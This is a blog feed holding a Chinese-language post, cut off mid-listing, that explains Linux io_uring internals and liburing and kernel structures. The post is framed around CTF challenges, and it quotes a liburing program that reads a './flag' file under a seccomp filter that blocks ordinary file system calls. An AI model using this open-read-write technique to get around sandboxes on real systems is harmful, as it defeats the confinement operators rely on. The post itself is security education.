<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>V3rdant&#39;s Blog</title>
  
  
  <link href="https://v3rdant.cn/atom.xml" rel="self"/>
  
  <link href="https://v3rdant.cn/"/>
  <updated>2023-12-07T02:11:35.215Z</updated>
  <id>https://v3rdant.cn/</id>
  
  <author>
    <name>V3rdant</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux.io_uring-Top-down-Approch</title>
    <link href="https://v3rdant.cn/Linux.io_uring-Top-down-Approch/"/>
    <id>https://v3rdant.cn/Linux.io_uring-Top-down-Approch/</id>
    <published>2023-12-04T06:08:56.000Z</published>
    <updated>2023-12-07T02:11:35.215Z</updated>
    
    <content type="html"><![CDATA[<p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p><p>本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 <code>io_uring</code>  具体的实现。</p><p>由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。</p><h2 id="overview">overview</h2><p>在开始前，首先介绍一下什么是<a href="https://man.archlinux.org/man/io_uring.7.en">io_uring</a> 。</p><p>io_uring 是 Linux 5.1 引入的一套新的异步 I/O 接口机制,主要有以下特点:</p><ol><li>高效 - 通过共享内存和锁自由的接口设计大大降低了系统调用开销。</li><li>灵活 - 支持阻塞,非阻塞,轮询多种调用方式,可以同时提交多个 I/O 请求并通过轮询或异步方式得到完成通知。</li><li>通用 - 支持文件,网络,时间,引用计数等多种 I/O,统一了异步 I/O 接口。</li></ol><p>io_uring 主要由提交队列(SQ)、完成队列(CQ)、SQEs 请求和 CQEs 结果组成。</p><p>其中SQE和CQE 分别是SQ和CQ中的一个实体。</p><p>应用通过mmap映射SQ和CQ,向SQ提交I/O请求,再通过读CQ获取I/O完成结果。这避免了大量的 context switch 和系统调用开销。</p><p>这里以ACTF星盟的师傅写的liburing实现orw的一个小例子来介绍一下io_uring 的工作原理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref from https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="type">int</span> fd, ret;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">4096</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备打开操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">    <span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Open error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = cqe-&gt;res;  <span class="comment">// 获取打开的文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备读取操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_read(sqe, fd, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备写操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_write(sqe, <span class="number">1</span>, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;Read %d bytes: %s\n&quot;, cqe-&gt;res, buffer);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理并关闭文件</span></span><br><span class="line">    io_uring_cqe_seen(&amp;ring, cqe);</span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line">    close(fd);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果要使用io_uring会经历如下流程：</p><p>首先通过 <code>io_uring_queue_init</code> 完成了初始化，io_uring的sq和cq队列也被创建</p><p>在库内部实际上是使用 <code>io_uring_setup</code> 和 <code>mmap</code> 两个syscall实现</p><p>前者完成了内核中相应结构体和资源的创建，后者将两个队列映射到用户态内存，通过共享内存方便用户态访问</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，用户使用 <code>io_uring_get_sqe</code> 得到一个sqe，(SQ队列中的一个实体) ，并根据所要完成的任务，设置sqe的各个成员， 这个过程是完全在用户态完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line"><span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>最后，通过 <code>io_uring_submit</code> 提交了请求，库内部实际上是调用了 <code>io_uring_enter</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_submit(&amp;ring);</span><br></pre></td></tr></table></figure><h3 id="io-uring任务收割模式">io_uring任务收割模式</h3><p>这里主要解释一下 <code>IORING_SETUP_SQPOLL</code> 和 <code>IORING_SETUP_IOPOLL</code> 的区别</p><blockquote><p>IORING_SETUP_SQPOLL<br>When this flag is specified, a kernel thread is created to<br>perform submission queue polling.  An io_uring instance<br>configured in this way enables an application to issue I/O<br>without ever context switching into the kernel.  By using<br>the submission queue to fill in new submission queue<br>entries and watching for completions on the completion<br>queue, the application can submit and reap I/Os without<br>doing a single system call.<br>If the kernel thread is idle for more than sq_thread_idle<br>milliseconds, it will set the IORING_SQ_NEED_WAKEUP bit in<br>the flags field of the struct io_sq_ring.  When this<br>happens, the application must call io_uring_enter(2) to<br>wake the kernel thread.  If I/O is kept busy, the kernel<br>thread will never sleep.  An application making use of<br>this feature will need to guard the io_uring_enter(2) call<br>with the following code sequence:<br>/*<br>* Ensure that the wakeup flag is read after the tail pointer<br>* has been written. It’s important to use memory load acquire<br>* semantics for the flags read, as otherwise the application<br>* and the kernel might not agree on the consistency of the<br>* wakeup flag.<br>*/<br>unsigned flags = atomic_load_relaxed(sq_ring-&gt;flags);<br>if (flags &amp; IORING_SQ_NEED_WAKEUP)<br>io_uring_enter(fd, 0, 0, IORING_ENTER_SQ_WAKEUP);</p></blockquote><blockquote><p>IORING_SETUP_IOPOLL<br>Perform busy-waiting for an I/O completion, as opposed to<br>getting notifications via an asynchronous IRQ (Interrupt<br>Request).  The file system (if any) and block device must<br>support polling in order for this to work.  Busy-waiting<br>provides lower latency, but may consume more CPU resources<br>than interrupt driven I/O.  Currently, this feature is<br>usable only on a file descriptor opened using the O_DIRECT<br>flag.  When a read or write is submitted to a polled<br>context, the application must poll for completions on the<br>CQ ring by calling io_uring_enter(2).  It is illegal to<br>mix and match polled and non-polled I/O on an io_uring<br>instance.<br>This is only applicable for storage devices for now, and<br>the storage device must be configured for polling. How to<br>do that depends on the device type in question. For NVMe<br>devices, the nvme driver must be loaded with the<br>poll_queues parameter set to the desired number of polling<br>queues. The polling queues will be shared appropriately<br>between the CPUs in the system, if the number is less than<br>the number of online CPU threads.</p></blockquote><p>即，SQPOLL 通过内核线程定时唤醒来收割任务<br>IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p><h3 id="struct">struct</h3><p>其次，需要在讲解前，介绍一下 liburing 和 内核暴露出的一些结构体：</p><h4 id="liburing">liburing</h4><p>首先是 <code>io_uring</code> 这是liburing 关于io_uring的核心管理结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> <span class="title">sq</span>;</span> <span class="comment">// sq 管理结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cq</span> <span class="title">cq</span>;</span> <span class="comment">// cq 管理结构体</span></span><br><span class="line"><span class="type">unsigned</span> flags;        <span class="comment">// setup时的flag设置</span></span><br><span class="line"><span class="comment">// 以下setup返回时写入params的一些信息</span></span><br><span class="line"><span class="type">int</span> ring_fd;           </span><br><span class="line"><span class="type">unsigned</span> features;   </span><br><span class="line"><span class="type">int</span> enter_ring_fd;</span><br><span class="line">__u8 int_flags;</span><br><span class="line">__u8 pad[<span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> pad2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_uring_sq</code>， sq的管理结构体， 这个结构体在6.5及以下的版本可以在内核中找到，在6.5以上的版本在内核中删除了，6.5以上存在io_rings，相当于io_uring_sq和io_uring_cq 的组合</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> *khead;</span><br><span class="line"><span class="type">unsigned</span> *ktail;</span><br><span class="line"><span class="comment">// Deprecated: use `ring_mask` instead of `*kring_mask`</span></span><br><span class="line"><span class="type">unsigned</span> *kring_mask;</span><br><span class="line"><span class="comment">// Deprecated: use `ring_entries` instead of `*kring_entries`</span></span><br><span class="line"><span class="type">unsigned</span> *kring_entries;</span><br><span class="line"><span class="type">unsigned</span> *kflags;</span><br><span class="line"><span class="type">unsigned</span> *kdropped;</span><br><span class="line"><span class="type">unsigned</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqes</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> sqe_head;</span><br><span class="line"><span class="type">unsigned</span> sqe_tail;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> ring_sz;</span><br><span class="line"><span class="type">void</span> *ring_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> ring_mask;</span><br><span class="line"><span class="type">unsigned</span> ring_entries;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> pad[<span class="number">2</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在此着重解释一下ring_ptr和 sqes两个成员：<br>这两个成员，在没有设置NO_MMAP的情况下，都是由 <code>io_uring_setup</code> 后用mmap映射得到的。</p><p>ring_prt指向一连串内核用来处理io_uring时的信息，例如当前循环队列head和tail， <code>io_uring_setup</code> 返回时会设置 <code>io_uring_params</code> 中的 sq_off 结构，这个结构就记录了各个成员信息，相对于ring_ptr的偏移， 最后在 [[#io_uring_setup_ring_pointers]] 中设置相关变量指向和内核共享的内存区域中对应的偏移。</p><p>而sqes，就是真正的共享队列的区域</p><p>类似的，存在io_uring_cq 结构体</p><h4 id="kernel">kernel</h4><p>首先是<code>io_uring_params</code></p><p>他是<code>io_uring_setup</code> 传入的参数，同时，返回时，kernel会给此结构体相应成员赋值.</p><p>此结构体也是提供给用户态的API</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> &#123;</span></span><br><span class="line">__u32 sq_entries;</span><br><span class="line">__u32 cq_entries;</span><br><span class="line">__u32 flags;</span><br><span class="line">__u32 sq_thread_cpu;   <span class="comment">// 内核任务处理线程占用的cpu</span></span><br><span class="line">__u32 sq_thread_idle;  <span class="comment">// 内核任务处理线程最大闲置时间，</span></span><br><span class="line">   <span class="comment">// 见`IORING_SETUP_SQPOLL`</span></span><br><span class="line">__u32 features;</span><br><span class="line">__u32 wq_fd;</span><br><span class="line">__u32 resv[<span class="number">3</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sqring_offsets</span> <span class="title">sq_off</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cqring_offsets</span> <span class="title">cq_off</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">__u8opcode;<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">__u8flags;<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">__u16ioprio;<span class="comment">/* ioprio for the request */</span></span><br><span class="line">__s32fd;<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64off;<span class="comment">/* offset into file */</span></span><br><span class="line">__u64addr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u32cmd_op;</span><br><span class="line">__u32__pad1;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64addr;<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">__u64splice_off_in;</span><br><span class="line">&#125;;</span><br><span class="line">__u32len;<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">__kernel_rwf_t</span>rw_flags;</span><br><span class="line">__u32fsync_flags;</span><br><span class="line">__u16poll_events;<span class="comment">/* compatibility */</span></span><br><span class="line">__u32poll32_events;<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">__u32sync_range_flags;</span><br><span class="line">__u32msg_flags;</span><br><span class="line">__u32timeout_flags;</span><br><span class="line">__u32accept_flags;</span><br><span class="line">__u32cancel_flags;</span><br><span class="line">__u32open_flags;</span><br><span class="line">__u32statx_flags;</span><br><span class="line">__u32fadvise_advice;</span><br><span class="line">__u32splice_flags;</span><br><span class="line">__u32rename_flags;</span><br><span class="line">__u32unlink_flags;</span><br><span class="line">__u32hardlink_flags;</span><br><span class="line">__u32xattr_flags;</span><br><span class="line">__u32msg_ring_flags;</span><br><span class="line">__u32uring_cmd_flags;</span><br><span class="line">&#125;;</span><br><span class="line">__u64user_data;<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line"><span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">__u16buf_index;</span><br><span class="line"><span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">__u16buf_group;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="comment">/* personality to use, if used */</span></span><br><span class="line">__u16personality;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__s32splice_fd_in;</span><br><span class="line">__u32file_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16addr_len;</span><br><span class="line">__u16__pad3[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u64addr3;</span><br><span class="line">__u64__pad2[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the ring is initialized with 